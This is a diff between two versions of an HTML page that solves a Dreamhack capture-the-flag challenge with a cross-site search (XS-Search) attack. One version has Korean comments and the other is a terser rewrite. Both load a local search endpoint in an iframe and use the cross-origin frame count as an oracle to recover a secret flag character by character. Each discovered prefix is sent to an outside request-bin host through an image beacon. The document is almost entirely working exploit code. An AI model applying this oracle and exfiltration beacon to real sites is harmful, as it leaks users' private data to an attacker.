@@ -1,79 +1,50 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="utf-8" />
-    <title>XS-Search Custom Exploit</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
   </head>
   <body>
-    <!-- 검색 결과를 받아볼 창 -->
-    <iframe id="probe" style="display:none;"></iframe>
-    <!-- 로깅용 이미지 -->
-    <img id="beacon" style="display:none;" />
-
+    <iframe id="iframe"></iframe>
+    <img id="img" />
     <script>
-      const HEX_SET = "0123456789abcdef}";
-      let flagPrefix = "DH{22d1445ad68e1922d1445ad68e194e044a16dc64437"; // 지금까지 알아낸 FLAG prefix
-
-      const probeFrame = document.getElementById("probe");
-      const beaconImg = document.getElementById("beacon");
-
-      // 주어진 URL을 iframe으로 로드하고, 내부에 frame이 있는지 여부를 Boolean으로 돌려줍니다.
-      function probeUrl(url) {
-        return new Promise((resolve) => {
-          const onLoad = () => {
-            try {
-              // cross-origin이어도 frame 개수(length)는 읽을 수 있습니다.
-              const innerFrames = probeFrame.contentWindow.frames.length;
-              resolve(innerFrames > 0);
-            } catch (e) {
-              // 뭔가 예외가 나면 "검색 실패"로 취급
-              resolve(false);
-            } finally {
-              probeFrame.removeEventListener("load", onLoad);
-            }
+      async function req(url) {
+        return await new Promise((resolve, reject) => {
+          const iframe = document.getElementById("iframe");
+          iframe.src = url;
+          iframe.onload = () => {
+            if (iframe.contentWindow.frames.length != 0) return resolve();
+            else return reject();
           };
-
-          probeFrame.addEventListener("load", onLoad);
-          probeFrame.src = url;
         });
       }
 
-      // query가 FLAG에 부분 문자열로 포함되어 있으면 true, 아니면 false
-      async function isInSecret(query) {
-        const searchUrl =
-          "http://127.0.0.1:8000/search?query=" + encodeURIComponent(query);
-        return await probeUrl(searchUrl);
+      async function search(query) {
+        try {
+          await req(`http://localhost:8000/search?query=${query}`);
+          return true;
+        } catch (e) {
+          return false;
+        }
       }
 
-      // 한 글자 찾을 때마다 로거로 쏘기
-      function reportProgress(prefix) {
-        beaconImg.src =
-          "https://qdihqcw.request.dreamhack.games/log?secret=" +
-          encodeURIComponent(prefix);
-      }
+      async function exploit() {
+        let chars = "0123456789abcdef}";
+        let secret = "DH{22d1445ad68e19";
 
-      async function runExploit() {
-        // '}' 나올 때까지 글자 하나씩 붙여 나간다.
-        while (!flagPrefix.includes("}")) {
-          for (const ch of HEX_SET) {
-            const candidate = flagPrefix + ch;
-
-            const hit = await isInSecret(candidate);
-            if (hit) {
-              flagPrefix = candidate;
-              reportProgress(flagPrefix);
-              console.log("[+] extended:", flagPrefix);
+        while (!secret.includes("}")) {
+          for (let c of chars) {
+            if (await search(secret + c)) {
+              secret += c;
+              img.src = `https://pjgvtzk.request.dreamhack.games/${secret}`;
               break;
             }
           }
         }
-
-        // 마지막으로 한 번 더 최종 FLAG 전송
-        reportProgress("FINAL_" + flagPrefix);
-        console.log("[*] done, flag =", flagPrefix);
       }
 
-      runExploit();
+      exploit();
     </script>
   </body>
 </html>
